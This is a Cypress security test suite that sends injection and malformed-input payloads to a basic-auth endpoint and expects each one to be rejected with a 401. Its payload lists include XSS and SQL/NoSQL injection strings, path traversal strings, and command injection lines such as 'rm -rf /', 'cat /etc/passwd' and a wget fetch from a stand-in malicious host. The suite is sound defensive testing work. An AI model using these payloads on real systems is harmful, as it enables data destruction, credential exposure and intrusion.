// cypress/e2e/security-auth.spec.js

import BasicAuthPage from '../pages/BasicAuthPage';

describe('Security Testing - Authentication', () => {
    // Test data for security scenarios
    const securityTestCases = {
        xssPayloads: [
            '<script>alert("xss")</script>',
            '"><img src=x onerror=alert("xss")>',
            'javascript:alert("xss")//',
            '\\"><script>alert("xss")</script>',
            '<img src="x" onerror="alert(\'xss\')">'
        ],
        sqlInjectionPayloads: [
            "' OR '1'='1",
            "admin' --",
            "' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "') OR ('1'='1"
        ],
        noSqlInjectionPayloads: [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '{$gt: ""}',
        ],
        commandInjectionPayloads: [
            '; ls -la',
            '& dir',
            '| cat /etc/passwd',
            '; rm -rf /',
            '` wget malicious.com/script.sh `'
        ],
        bufferOverflowAttempts: [
            'A'.repeat(1024),
            'A'.repeat(2048),
            '％'.repeat(1024),  // Multi-byte character
            'A'.repeat(4096),
            '👾'.repeat(1024)   // Emoji character
        ]
    };

    describe('XSS Prevention Tests', () => {
        securityTestCases.xssPayloads.forEach((payload, index) => {
            it(`should handle XSS payload ${index + 1} safely`, () => {
                cy.request({
                    url: '/basic_auth',
                    failOnStatusCode: false,
                    auth: {
                        username: payload,
                        password: payload
                    }
                }).then(response => {
                    expect(response.status).to.equal(401);
                });
            });
        });
    });

    describe('SQL Injection Prevention Tests', () => {
        securityTestCases.sqlInjectionPayloads.forEach((payload, index) => {
            it(`should prevent SQL injection attempt ${index + 1}`, () => {
                // Test username field
                cy.request({
                    url: '/basic_auth',
                    failOnStatusCode: false,
                    auth: {
                        username: payload,
                        password: 'regular_password'
                    }
                }).then(response => {
                    expect(response.status).to.equal(401);
                });

                // Test password field
                cy.request({
                    url: '/basic_auth',
                    failOnStatusCode: false,
                    auth: {
                        username: 'regular_username',
                        password: payload
                    }
                }).then(response => {
                    expect(response.status).to.equal(401);
                });
            });
        });
    });

    describe('NoSQL Injection Prevention Tests', () => {
        securityTestCases.noSqlInjectionPayloads.forEach((payload, index) => {
            it(`should prevent NoSQL injection attempt ${index + 1}`, () => {
                cy.request({
                    url: '/basic_auth',
                    failOnStatusCode: false,
                    auth: {
                        username: payload,
                        password: 'regular_password'
                    }
                }).then(response => {
                    expect(response.status).to.equal(401);
                });
            });
        });
    });

    describe('Command Injection Prevention Tests', () => {
        securityTestCases.commandInjectionPayloads.forEach((payload, index) => {
            it(`should prevent command injection attempt ${index + 1}`, () => {
                cy.request({
                    url: '/basic_auth',
                    failOnStatusCode: false,
                    auth: {
                        username: payload,
                        password: 'regular_password'
                    }
                }).then(response => {
                    expect(response.status).to.equal(401);
                });
            });
        });
    });

    describe('Buffer Overflow Prevention Tests', () => {
        securityTestCases.bufferOverflowAttempts.forEach((payload, index) => {
            it(`should handle large input attempt ${index + 1} safely`, () => {
                // Test username field
                cy.request({
                    url: '/basic_auth',
                    failOnStatusCode: false,
                    auth: {
                        username: payload,
                        password: 'regular_password'
                    }
                }).then(response => {
                    expect(response.status).to.equal(401);
                });

                // Test password field
                cy.request({
                    url: '/basic_auth',
                    failOnStatusCode: false,
                    auth: {
                        username: 'regular_username',
                        password: payload
                    }
                }).then(response => {
                    expect(response.status).to.equal(401);
                });
            });
        });
    });

    describe('Advanced Security Scenarios', () => {
        it('should handle null byte injection attempts', () => {
            const nullBytePayloads = [
                'admin%00',
                'admin\0',
                'admin\u0000',
                'admin%00extra'
            ];

            nullBytePayloads.forEach(payload => {
                cy.request({
                    url: '/basic_auth',
                    failOnStatusCode: false,
                    auth: {
                        username: payload,
                        password: 'regular_password'
                    }
                }).then(response => {
                    expect(response.status).to.equal(401);
                });
            });
        });

        it('should prevent HTTP Response Splitting', () => {
            const responseSplittingPayloads = [
                '%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Attack</html>',
                'username%0d%0aSet-Cookie:%20malicious=value'
            ];

            responseSplittingPayloads.forEach(payload => {
                cy.request({
                    url: '/basic_auth',
                    failOnStatusCode: false,
                    auth: {
                        username: payload,
                        password: 'regular_password'
                    }
                }).then(response => {
                    expect(response.status).to.equal(401);
                });
            });
        });

        it('should handle Unicode normalization attacks', () => {
            const unicodePayloads = [
                'ａｄｍｉｎ',  // Fullwidth characters
                'admin\u0308',  // Combined diacritical marks
                'åᗪᙢᓰᘉ',      // Look-alike characters
                'ādmīn'        // Extended Latin
            ];

            unicodePayloads.forEach(payload => {
                cy.request({
                    url: '/basic_auth',
                    failOnStatusCode: false,
                    auth: {
                        username: payload,
                        password: 'regular_password'
                    }
                }).then(response => {
                    expect(response.status).to.equal(401);
                });
            });
        });

        it('should prevent path traversal attempts', () => {
            const pathTraversalPayloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32',
                '%2e%2e%2f%2e%2e%2f',
                '....//....//....//etc/passwd'
            ];

            pathTraversalPayloads.forEach(payload => {
                cy.request({
                    url: '/basic_auth',
                    failOnStatusCode: false,
                    auth: {
                        username: payload,
                        password: 'regular_password'
                    }
                }).then(response => {
                    expect(response.status).to.equal(401);
                });
            });
        });
    });
});